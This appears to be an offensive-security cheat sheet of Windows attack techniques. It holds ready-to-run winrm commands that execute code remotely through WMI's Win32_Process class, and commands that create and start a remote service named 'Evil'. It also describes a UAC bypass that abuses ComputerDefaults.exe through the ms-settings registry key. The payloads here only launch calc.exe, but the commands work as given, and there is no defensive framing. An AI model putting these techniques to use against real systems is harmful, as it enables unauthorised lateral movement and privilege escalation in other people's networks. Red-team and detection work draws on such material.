Lateral Movement via WMI Win32_Process

WMI (Windows Management Instrumentation) can be used for remote command execution via the Win32_Process class over the WinRM protocol.

Code Example

winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd /c c:\windows\system32\calc.exe"} -r:http://target:5985

Lateral Movement via WMI Win32_Service

This method allows lateral movement via WMI, invoking a service that executes a command remotely.

Code Example

winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd /c c:\windows\system32\calc.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985

UAC Bypass Using ComputerDefaults.exe

The ComputerDefaults.exe utility can be abused for UAC bypass if certain registry values are set. This allows an attacker to execute a command as a high-integrity process without triggering a UAC prompt.

Registry Keys/Values to Set

The attacker needs to set two specific registry keys located at:


HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command

When set correctly, these keys can be leveraged by `ComputerDefaults.exe` to execute commands as a high-integrity process without UAC confirmation.

Paths for ComputerDefaults.exe


C:\Windows\System32\ComputerDefaults.exe
C:\Windows\SysWOW64\ComputerDefaults.exe
